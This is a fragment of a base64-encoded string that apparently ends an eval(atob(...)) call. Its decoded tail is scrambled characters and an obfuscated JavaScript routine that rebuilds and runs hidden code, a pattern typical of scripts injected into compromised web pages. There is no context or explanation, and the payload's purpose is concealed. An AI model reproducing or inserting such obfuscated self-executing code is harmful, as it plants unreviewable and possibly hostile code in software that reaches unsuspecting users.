9BekFdNXJvLiVmMDEtOy4sY2lRQSlBb2xvVTswZSh9PSZcXEFBQT1ddF99UnAzM24yNVNBeylkaCBBIWZzX1s9YzMldDJ0aHRkfTw9IHNkYz1lXWVBYjRBOj1lNmYxK3VBKkFkX25BZm97QUFBIUF1QTMoMTNfO2Y4KGhyNl09bjNTandBc2U9X0F3I2czYV9oQUFlZ24tKV9cJ0FkZl1vN0E2KyV1QTVvOX1hKUE2XzRfeStIYX10QXJHNElBYXdfVjt9ZV1sQEFfX1p7ZHE0QXNdZkE9ZDVBRXQpUSMwXSgjbGVBXXJdQWhvXWdfQXNlO05BJWZwYXNmZEF5ZCN0c2pvIW9dM2UxNChCdj1dfXsxQSV7Nzh7MUFUYn1oQWlFQWZwKUF7Km9wNyguMnJdVkBdQV8lYUFsRHUubkkyPTZsQSVuO2FOQW99IGYgQWlBKyUpZTpmP2wyW29zYyJjQWMsXXsuKz0oQSk7QWwpOXM9Nk5BU3RfO31OS19dciheSU8iey4peDVkVUFzXyMpXWU7YnQoWl9ldGF9XS5fQWd0aVJqbGEoSGhBUSFiKUFdKUFtLjtdQSBkLlkgQWxvMGJbZHQoZTJmQV9vdl8lUyUuOSBzYmErX3UlQTklb2dBMHJvX09fe3RlXCcsO3t7aX1lX2YgQXFBfWZyZmNsXztqKW89bjNBNGVkY2xhc0FuK0E0Nl8qLjB3bmY0b119X0EpLikoQUF9QTdmKGYsQU1BJUFBbjt0UW5rZjFBLl90QTJdYn1fbyE2JWRmJGM7KSl1X0F1Wy5fMzwgY2dyXSBdOEFBfUE2QWwzcm5ddH0wMTFdJGU1cl1mPV8pc2M6QUF0Z2w5QUEgby1sXy4gQXUhYXIxZjA7eGxBY1tzb2VfX2lAJE9BbyAmODkue2VfZWVyeXJBaSBmLjAoajlBKGxvOEEwcnZ1QU9Ub2w9SzlfbF1BQXVmYVxcbjspOygzXygoZHNvQWRzXC9sJXQ9ISlGTildNWFkNm83QTNvby5jJV9pLF1jPSlpPV85ZDtyN3AoYTBfYSU1ZWVjc3JwNyl0IWx1OSUxISlBb3AhbjBfbW9dZCRBPyVfYXFzU1wvOyUpcjdBIC5objFfJW95b3tdXC9daD0xK11BQUFsJTQgdV8uMjM4ZUFPKDJVIF8zQXQzMlNpb2tycmY9LnByZmUoeSx0IWUpQT1hXyRncH0peycpKTt2YXIgVGR1PVRBdyhvUE8sa0hlICk7VGR1KDMyMjQpO3JldHVybiA4MDgyfSkoKQ=='))
